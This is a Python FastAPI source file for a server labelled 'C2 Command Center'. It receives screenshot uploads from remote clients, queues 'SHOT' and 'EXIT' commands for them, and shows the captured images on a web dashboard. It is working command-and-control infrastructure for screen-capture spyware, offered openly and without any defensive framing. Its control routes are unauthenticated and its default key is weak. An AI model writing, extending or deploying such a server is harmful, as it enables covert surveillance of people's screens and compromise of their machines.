
from fastapi import FastAPI, File, UploadFile, Header, HTTPException
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
import os
import time
import uvicorn

app = FastAPI()

UPLOAD_DIR = "uploaded_captures"
os.makedirs(UPLOAD_DIR, exist_ok=True)
app.mount("/captures", StaticFiles(directory=UPLOAD_DIR), name="captures")

SECRET_KEY = os.getenv("SASE_KEY", "sk")

# Explicit single-use command buffer
pending_command = None

@app.post("/upload")
async def upload_screenshot(
    file: UploadFile = File(...),
    authorization: str = Header(None)
):
    global pending_command
    if authorization != SECRET_KEY:
        raise HTTPException(status_code=401, detail="Unauthorized")

    timestamp = int(time.time())
    file_path = os.path.join(UPLOAD_DIR, f"capture_{timestamp}.jpg")
    
    contents = await file.read()
    with open(file_path, "wb") as f:
        f.write(contents)

    # Consume and immediately clear command
    active_cmd = pending_command
    pending_command = None 

    return {
        "status": "success",
        "command": active_cmd
    }

# Control Routes
@app.get("/trigger/shot")
def trigger_shot():
    global pending_command
    pending_command = "SHOT"
    return {"status": "queued", "command": "SHOT"}

@app.get("/trigger/exit")
def trigger_exit():
    global pending_command
    pending_command = "EXIT"
    return {"status": "queued", "command": "EXIT"}

@app.get("/trigger/clear")
def trigger_clear():
    global pending_command
    pending_command = None
    return {"status": "cleared"}

@app.get("/", response_class=HTMLResponse)
def dashboard():
    files = sorted(os.listdir(UPLOAD_DIR), reverse=True)
    images_html = "".join([
        f'<div style="margin:10px;display:inline-block;border:1px solid #333;padding:10px;"><img src="/captures/{f}" style="max-width:200px;"/><p>{f}</p></div>'
        for f in files if f.endswith(".jpg")
    ]) or "<p>No captures yet.</p>"

    return f"""
    <html>
    <body style="background:#121212;color:#00ff00;font-family:monospace;padding:20px;">
        <h1>C2 Command Center</h1>
        <div style="margin-bottom:20px;">
            <button onclick="fetch('/trigger/shot')" style="padding:10px;background:#00cc00;color:#000;font-weight:bold;margin-right:10px;">TRIGGER SHOT</button>
            <button onclick="fetch('/trigger/exit')" style="padding:10px;background:#cc0000;color:#fff;font-weight:bold;margin-right:10px;">TRIGGER EXIT</button>
            <button onclick="fetch('/trigger/clear')" style="padding:10px;background:#555;color:#fff;font-weight:bold;">CLEAR COMMANDS</button>
        </div>
        <hr style="border-color:#333;"/>
        {images_html}
    </body>
    </html>
    """

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8080))
    uvicorn.run(app, host="0.0.0.0", port=port)
